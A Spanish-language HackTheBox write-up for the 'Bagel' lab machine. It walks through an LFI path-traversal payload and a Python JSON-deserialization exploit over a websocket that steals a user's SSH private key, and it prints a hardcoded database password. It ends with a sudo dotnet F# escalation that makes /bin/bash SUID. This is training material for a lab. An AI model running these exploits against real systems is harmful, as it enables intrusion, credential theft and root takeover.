---
layout: single
title: Bagel - HackTheBox
excerpt: " A box of medium difficulty in which concepts such as: Json attacks, code analysis, script creation, etc. are presented. "
date: 2023-02-19
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-bagel/bagel.png
  teaser_home_page: true
  icon: /blog/assets/images/HTB.webp
categories:
  - hackthebox
tags:
  - LFI
  - Python
  - Json Deserialization
  - sudoers
  - dotnet
  - Ilspy
  - f#
---

A box of medium difficulty in which concepts such as: Json attacks, code analysis, script creation, etc. are presented.

# Summary
- IP: 10.129.21.151
- Ports: 22, 5000, 8000
- OS: Linux
- Services & Applications:
	-  22 -> OpenSSH 8.8 (protocol 2.0)
	-  5000 -> upnp?
	-  8000 -> http-alt Werkzeug/2.2.2 Python/3.10.9

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.21.151 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,5000,8000 -sCV 10.129.21.151 -oN targeted
```


# Análisis de página web (puerto 8000):

- De primeras, al entrar nos redirecciona al dominio `"bagel.htb"` el cual lo tendremos que añadir al `"/etc/hosts"`

- Al acceder a la web, no vemos nada interesante, sin embargo si revisamos el link podemos ver un posible `LFI` ya que se está llamando un parámetro "page".

```
http://bagel.htb:8000/?page=../../../../../../../etc/passwd
```

- Nos da la opción de descarga el archivo "passwd" lo que confirma el LFI, descargamos el archivo y enumeramos los usuarios del sistema:

```bash
$cat passwd | grep "sh"
```

```
phil
developer
```

- Al no encontrar nada interesante con una búsqueda típica de LFI, comenzamos a enumerar recursos más complejos, como listar los `procesos`:

```
http://bagel.htb:8000/?page=../../../../../../../proc/self/cmdline
```

- Descargamos el archivo `"cmdline"` y vemos el contenido:

```bash
$cat cmdline
```

```bash
python3/home/developer/app/app.py
```

- Intentamos acceder a este supuesto archivo que se está ejecutando como proceso dentro del sistema:

```
http://bagel.htb:8000/?page=../../../../../../../home/developer/app/app.py
```

- Descargamos y analizamos el código del archivo:

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```



# Deserialización Json y análisis de código:

- Como podemos deducir, se está haciendo uso de un `webSocket` en el puerto `5000` el cual envía en formato `json` el contenido del archivo "orders.txt" haciendo uso de la función "ReadOrder"; nos podemos hacer a la idea de una posible deserialización Json; además, se hace mención de credenciales "SSH", esta información la usaremos más adelante.

- Si hacemos una búsqueda de cada proceso que se está ejecutando dentro del sistema encontramos un archivo `"bagel.dll"`:

```bash
for i in $(seq 900 1000); do curl http://10.129.21.151:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
```

- Encontramos la ruta de dicho archivo y accedemos a él:

```bash
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
```

```
http://bagel.htb:8000/?page=../../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
```

- Descargamos el archivo y lo analizamos profundamente con [iILSpy: .NET Decompiler](https://github.com/icsharpcode/ILSpy)

- Encontramos posibles `credenciales`: 

```c#
string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
```

- Encontramos varias funciones interesantes como: ReadOrder, WriteOrder, RemoveOrder, ReadFile, WriteFile.

- Si analizamos la función "ReadOrder" podemos observar que se implementa sanitización a LFI, por lo que esta función queda descartada para un posible ataque.

- Si analizamos la función "RemoveOrder" nos damos cuenta que se trata de un "Objeto", el cuál podríamos usar para realizar un ataque [Json Deserialization](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) usando el código de la app que habíamos encontrado con un par de modificaciones:

```bash
$nano exploitjsondes.py
```

```python
import json,websocket
ws = websocket.WebSocket()    
ws.connect("ws://10.129.21.151:5000/") # connect to order app
order = { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

###### NOTA: Los parámetros "bagel_server.File" "bagel" los podemos encontrar en el mismo archivo "bagel.dll" con "ILspy".

- El valor del atributo "$type" es una cadena de caracteres que indica el tipo del objeto, y en este caso, el valor es "bagel_server.File, bagel". El valor del atributo "ReadFile" ( que habíamos encontrado en el análisis del dll) es una cadena de caracteres que indica la ruta de un archivo en el sistema de archivos del servidor.

- Ejecutamos la script que hemos creado y obtenemos el contenido del archivo `"id_rsa"` del usuario "phil":

```bash
$python3 exploitjsondes.py
```

- Ahora con la clave privada del usuario "phil" podemos acceder via `SSH` sin contraseña:

```bash
$nano id_rsa
$chmod +600 id_rsa
$ssh -i id_rsa phil@10.129.21.151
```

- Habremos ganado acceso al sistema como "phil".


# ESCALANDO PRIVILEGIOS:

- En el análisis del archivo "bagel.dll" habíamos encontrado `credenciales` para un supuesto usuario "dev", intentamos pivotar con esta credencial al usuario "developer".

```bash
$su developer
```

- Como el usuario developer, listamos los permisos de `sudoers` y vemos lo siguiente:

```bash
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

- Es decir, podemos ejecutar como root el binario `"dotnet"` sin contraseña, esto podríamos aprovecharlo de diversas formas, en este caso, abribremos la consola interactiva de `.NET` (fsi) como root:

```bash
$sudo /usr/bin/dotnet fsi
```

- Y dentro de la consola interactiva podemos escribir el código en lenguaje F# que ejecute el comando `"chmod u+s /bin/bash"` dentro del sistema; al ser root, debería ejecutarse sin problemas y podríamos ejecutar la bash con privilegios:

```F#
open System.Diagnostics

let psi = new ProcessStartInfo("chmod", "u+s /bin/bash")
psi.UseShellExecute <- false
let process = Process.Start(psi)
process.WaitForExit() |> ignore
;;
```

- Presionamos ENTER al final, y si ejecutamos `"ls -la /bin/bash"` podremos comprobar que las bash tiene permisos SUID.

- Ejecutamos la bash con privilegios y seremos `root` pudiendo leer las dos flags.

```bash
$bash -p
```

